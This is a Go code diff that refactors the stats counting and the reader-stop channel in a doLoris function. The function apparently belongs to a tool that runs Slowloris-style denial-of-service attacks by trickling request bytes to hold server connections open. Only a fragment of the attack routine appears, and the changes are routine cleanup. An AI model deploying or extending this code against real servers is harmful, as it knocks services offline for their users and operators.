@@ -152,7 +152,7 @@ func doLoris(config *Config, scheme, destinationHostPort string, conn io.ReadWri
 	target := scheme + "://" + destinationHostPort
 	headerLen, err := conn.Write(requestHeader)
 
-	a.AddStats(target, metrics.Stats{1, 0, 0, uint64(headerLen), 0})
+	a.AddStats(target, metrics.Stats{1, 0, 0, uint64(headerLen)})
 
 	if err != nil {
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
@@ -161,15 +161,15 @@ func doLoris(config *Config, scheme, destinationHostPort string, conn io.ReadWri
 		return
 	}
 
-	readerStopCh := make(chan int, 1)
+	readerStopCh := make(chan struct{})
 	go nullReader(conn, readerStopCh, logger)
 
 	var bytesSent int
 	for ; bytesSent < config.ContentLength; bytesSent++ {
 		select {
 		case <-time.After(config.SleepInterval):
-		case bytesReceived := <-readerStopCh:
-			a.AddStats(target, metrics.Stats{0, 0, 1, 0, uint64(bytesReceived)})
+		case <-readerStopCh:
+			a.AddStats(target, metrics.Stats{0, 0, 1, 0})
 
 			break
 		}
@@ -184,10 +184,10 @@ func doLoris(config *Config, scheme, destinationHostPort string, conn io.ReadWri
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusSuccess)
 	}
 
-	a.AddStats(target, metrics.Stats{0, 1, 0, uint64(bytesSent), 0})
+	a.AddStats(target, metrics.Stats{0, 1, 0, uint64(bytesSent)})
 }
 
-func nullReader(conn io.Reader, ch chan<- int, logger *zap.Logger) {
+func nullReader(conn io.Reader, ch chan<- struct{}, logger *zap.Logger) {
 	n, err := conn.Read(sharedReadBuf)
 	if err != nil {
 		logger.Debug("error when reading server response", zap.Error(err))
@@ -195,5 +195,5 @@ func nullReader(conn io.Reader, ch chan<- int, logger *zap.Logger) {
 		logger.Debug("unexpected response read from server", zap.ByteString("buffer", sharedReadBuf[:n]))
 	}
 
-	ch <- n
+	close(ch)
 }
